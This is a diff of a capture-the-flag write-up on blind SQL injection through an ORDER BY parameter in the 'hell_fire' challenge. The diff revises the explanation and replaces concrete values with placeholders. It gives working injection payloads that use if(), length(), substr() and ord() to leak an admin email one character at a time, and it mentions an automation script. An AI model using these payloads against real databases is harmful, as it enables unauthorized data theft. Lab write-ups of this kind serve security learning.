@@ -36,90 +36,46 @@ SELECT id,email,score FROM prob_hell_fire WHERE 1 ORDER BY id
 There are two users: `admin` and `rubiya`.
 
 We can solve this challenge using two different methods:
-1. Assigning sort value
-2. Sorting by different columns
+
+- [Assigning sort value](#blind-sql-injection---assigning-different-sort-value)
+- [Sorting by different columns](#blind-sql-injection---sorting-by-different-columns)
 
 ## Blind SQL Injection - (Assigning different sort value)
-
-In this method, we will assign a sort value to the result that we want.
 
 ### Retrieving the email length
 
 If we provide the following URI parameter:
 
 ```
-?order=if(id='admin' AND length(email)=1, 1, 2)
+?order=if(id='admin' AND length(email)=[length], 1, 2)
 ```
 
 The resultant query becomes:
 
 ```sql
-SELECT id,email,score FROM prob_hell_fire WHERE 1 ORDER BY if(id='admin' AND length(email)=num, 1, 2)
+SELECT id,email,score FROM prob_hell_fire WHERE 1 ORDER BY if(id='admin' AND length(email)=[length], 1, 2)
 ```
 
-Rows where `id='admin'` and `length(email)=1` will be given a sort value of 1 and will appear first. All other rows will be given a sort value of 3 and will appear afterwards.
+Rows where the length of email for id='admin' is equal to the [length] that we provide, will be given the sort value 1. All other rows will be given the sort value 2. Rows with a lower sort value will appear first within the table.
 
-![3](https://github.com/Kunull/Write-ups/assets/110326359/69eee14a-1f35-4577-a4bf-794968d7b3c0)
-
-Since the `admin` user is not sorted first, it means that `id='admin' AND length(email)=1` did not result in `True`. This tells us that the email length is greater than 1.
-
-We can move onto greater values:
-
-```
-?order=if(id='admin' AND length(email)=28, 1, 2)
-```
-
-The resultant query becomes:
-
-```sql
-SELECT id,email,score FROM prob_hell_fire WHERE 1 ORDER BY if(id='admin' AND length(email)=28, 1, 2)
-```
-
-![4](https://github.com/Kunull/Write-ups/assets/110326359/3fb5f2f3-0632-4a05-9710-787bed3e5706)
-
-Since the `admin` user is sorted first, it means that `id='admin' AND length(email)=1` resulted in `True`. This tells us that the email length is 28.
+So, if the admin user appears first, we know that the [length] was correct.
 
 ### Leaking the email
 
 If we provide the following URI parameter:
 
 ```
-?order=if(id='admin' AND substr(email, 1, 1)='0', 1, 2)
+?order=if(id='admin' AND ord(substr(email, [index], 1))='ord([character])', 1, 2)
 ```
 
 The resultant query becomes:
 
 ```sql
-SELECT id,email,score FROM prob_hell_fire WHERE 1 ORDER BY if(id='admin' AND substr(email, 1, 1)='0', 1, 2)
+SELECT id,email,score FROM prob_hell_fire WHERE 1 ORDER BY if(id='admin' AND ord(substr(email, 1, 1))='ord([character])', 1, 2)
 ```
 
-Rows where `id='admin'` and `substr(email, 1, 1)='0'` will be given a sort value of 1 and will appear first. All other rows will be given a sort value of 3 and will appear afterwards.
+Rows where the id='admin' and character of the email at [index] is the same as the [character] that we provide, will be given the sort value 1. All other rows will be given sort value 2. Rows with a lower sort value will appear first within the table.
 
-![6](https://github.com/Kunull/Write-ups/assets/110326359/2c496b75-0a47-4745-8587-13851ba99c00)
-
-Since the `admin` user is not sorted first, it means that `id='admin' AND substr(email, 1, 1)='0'` did not result in `True`. This tells us that the first character of the email is not `0`.
-
-We can move onto other characters:
-
-```
-?order=if(id='admin' AND substr(email, 1, 1)='a', 1, 2)
-```
-
-The resultant query becomes:
-
-```sql
-SELECT id,email,score FROM prob_hell_fire WHERE 1 ORDER BY if(id='admin' AND substr(email, 1, 1)='a', 1, 2)
-```
-
-![[7 74.png]]
-
-Since the `admin` user is first, it means that `id='admin' AND substr(email, 1, 1)='0'` resulted in `True`. This tells us that the first character of the email is `a`.
-
-We can leak out all 28 character this way.
-
-```
-admin_secure_email@emai1.com
-```
 ### Script
 
 We can automate this process using a script. Since `_` and `.` are filtered out, we will have to convert these characters into their ASCII representation using the `ord()` function.
@@ -317,7 +273,9 @@ The resultant query becomes:
 SELECT id,email,score FROM prob_hell_fire WHERE 1 ORDER BY if(id='admin' AND length(email)=28, 'id', 'score')
 ```
 
-If `length(email)=28` for `id='admin'`, the rows will be sorted by `id`. Otherwise, they will be sorted by `score`.
+If the length of email for id='admin' is equal to the [length] that we provide, the rows will be sorted by `id`. Otherwise, the rows will be sorted by `score`.
+
+So, if the admin user appears first, we know that the [length] was correct.
 
 ### Leaking the email
 
@@ -333,7 +291,9 @@ The resultant query becomes:
 SELECT id,email,score FROM prob_hell_fire WHERE 1 ORDER BY if(id='admin' AND substr(email, 1, 1)='a', 'id', 'score')
 ```
 
-If the first character of `email` for `id='admin'`, the rows will be sorted by `id`. Otherwise, they will be sorted by `score`.
+If the id='admin' and character of the email at [index] is the same as the [character] that we provide, the rows will be sorted by `id`. Otherwise, the rows will be sorted by `score`.
+
+So, if the admin user appears first, we know that the [character] at [index] was correct.
 
 ### Script
 
